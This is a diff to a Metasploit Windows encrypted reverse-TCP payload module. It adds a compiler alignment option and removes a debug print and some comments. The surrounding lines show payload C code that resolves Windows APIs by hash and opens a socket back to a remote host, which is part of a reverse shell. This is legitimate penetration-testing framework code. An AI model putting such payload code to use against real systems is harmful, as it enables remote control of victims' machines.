@@ -37,10 +37,10 @@ module Payload::Windows::EncryptedReverseTcp
     {
       strip_symbols: datastore['StripSymbols'],
       linker_script: datastore['LinkerScript'],
+      align_obj:     datastore['AlignObj'] || '',
       arch:          self.arch_to_s
     }
 
-    puts src
     Metasploit::Framework::Compiler::Mingw.compile_c(src, compile_opts)
     src
   end
@@ -300,7 +300,6 @@ module Payload::Windows::EncryptedReverseTcp
         char port[] = { #{port} };
         char ws2[] = { 'w', 's', '2', '_', '3', '2', '.', 'd', 'l', 'l', 0 };
 
-        // first get address of loadlibrary
         LoadALibrary = (FuncLoadLibraryA) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'LoadLibraryA')}); // hash('kernel32.dll', 'LoadLibrary') -> 0x0726774C
         LoadALibrary((LPTSTR) ws2);
       ^
@@ -314,7 +313,6 @@ module Payload::Windows::EncryptedReverseTcp
 
   def start_comm
     %Q^
-        // set up a socket
         struct addrinfo *info = NULL;
         info = conn_info_setup(ip, port);
         WSASock = (FuncWSASocketA) GetProcAddressWithHash(#{get_hash('ws2_32.dll', 'WSASocketA')}); // hash('ws2_32.dll', 'WSASocketA') -> 0xe0df0fea
@@ -325,7 +323,6 @@ module Payload::Windows::EncryptedReverseTcp
           ExitProcess(proc_term_status);
         }
 
-        // connect
         ConnectSock = (FuncConnect) GetProcAddressWithHash(#{get_hash('ws2_32.dll', 'connect')}); // hash('ws2_32.dll', 'connect') -> 0x6174a599
         if(ConnectSock(conn_socket, info->ai_addr, info->ai_addrlen) == SOCKET_ERROR)
         {
